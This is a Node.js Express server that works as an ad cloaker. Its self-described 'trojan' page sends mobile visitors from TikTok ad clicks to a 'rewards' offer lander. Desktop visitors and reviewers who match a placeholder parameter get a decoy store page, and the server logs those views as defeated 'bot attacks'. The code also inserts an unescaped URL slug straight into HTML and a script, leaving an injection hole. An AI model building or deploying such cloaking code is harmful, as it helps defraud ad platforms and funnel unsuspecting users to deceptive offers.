const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const { Client } = require('pg');
const bodyParser = require('body-parser');

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));
// Use bodyParser middleware to parse JSON request bodies
app.use(bodyParser.json());

// Middleware to handle requests to /:offer/:slug
app.get('/:offer/:slug', (req, res, next) => {
    const { offer, slug } = req.params;
    const ttclid = req.query.ttclid;
    const destinationLander = `https://rewards-for-all.com/${offer}?ttclid=${ttclid}&slug=${slug}.html`;
    const trojanHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <script>
                // Cloaker logic
                const urlParams = new URLSearchParams(window.location.search);
                const utmXXX = urlParams.get("xxx");
                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
                if (utmXXX === "__PLACEMENT__") {
                    } else if (isMobileDevice) {
                        window.location.href = "${destinationLander}";
                    } else {
                    }
            </script>
            <title>${slug}</title>
        </head>
        <body>
            <h1>Welcome to our Store!</h1>
            <p>You are shopping at: ${slug}</p>
            <script>
                function sendPostRequest() {
                    const urlParams = new URLSearchParams(window.location.search);
                    const ttclid = urlParams.get('ttclid');
                    const botView = true;
                    const slug = ${slug}
                    const postData = {
                        ttclid: ttclid,
                        botView: botView,
                        slug: slug
                    };
                    fetch('/response', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(postData)
                    })
                };
                sendPostRequest();
            </script>
        </body>
        </html>
    `;
    res.send(trojanHTML);
    console.log(`Served ${offer} Trojan (${slug})`);
});

// Middleware to receive and log analytics
app.post('/response', async (req, res) => {
    try {
        const { ttclid, botView, landerView, clickedThrough, offer, slug } = req.body;
        let ttclid_view = ttclid.substring(0, 5);
        
        // Logic to log a clickThrough and return response so they can redirect
        if (clickedThrough) {
            const clickThroughQuery = {
                text: 'UPDATE activitylog SET clickedthrough = $1 WHERE TTCLID = $2',
                values: [clickedThrough, ttclid]
            };
            try {
                await client.query(clickThroughQuery);
                console.log(`User ${ttclid_view} sent to ${offer} Offer thru ${slug}`);
                return res.status(200).send('Click through logged successfully.');
            } catch (error) {
                console.error(`Error logging click through, ${ttclid_view} redirected anyways. ${slug} ${offer}`, error);
                return res.status(200).send('Proceed to offer');
            }
        }
        
        // Logic to log a landerView
        if (landerView) {
            const landerViewQuery = {
                text: 'INSERT INTO activitylog (TTCLID, landerView, slug, offer) VALUES ($1, $2, $3, $4)',
                values: [ttclid, landerView, slug, offer]
            };
            try {
                await client.query(landerViewQuery);
                console.log(`User ${ttclid_view} is viewing ${offer} lander from ${slug}`);
            } catch (error) {
                console.error(`Error logging ${ttclid_view} lander view: ${slug} ${offer}`, error);
            }
        }

        // Logic to log a botView
        if (botView) {
            const botViewQuery = {
                text: 'INSERT INTO activitylog (botView, slug, offer) VALUES ($1, $2, $3)',
                values: [botView, slug, offer]
            };
            try {
                await client.query(botViewQuery);
                console.log(`Bot attack defeated: ${slug} ${offer}`);
            } catch (error) {
                console.error(`Error logging bot attack: ${slug} ${offer}`, error);
            }
        }
    } catch (error) {
        console.error('Unknown Error handling request:', error);
        return res.status(200).send('Unknown Error');
    }
});

// Start the HTTP server
const PORT = 8080;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

// Read DB password
const dbPassword = process.env.DATABASE_PW;

// Create PostgreSQL client
const client = new Client({
  host: 'app-25787a0a-b9f7-4567-a04b-7b383f161891-do-user-15644970-0.c.db.ondigitalocean.com',
  port: 25060,
  user: 'db',
  password: dbPassword,
  database: 'db'
});

// Connect to the PostgreSQL database
client.connect((err) => {
  if (err) {
    console.error('Error connecting to PostgreSQL database:', err);
    return;
  }
  console.log('Connected to PostgreSQL database');
});
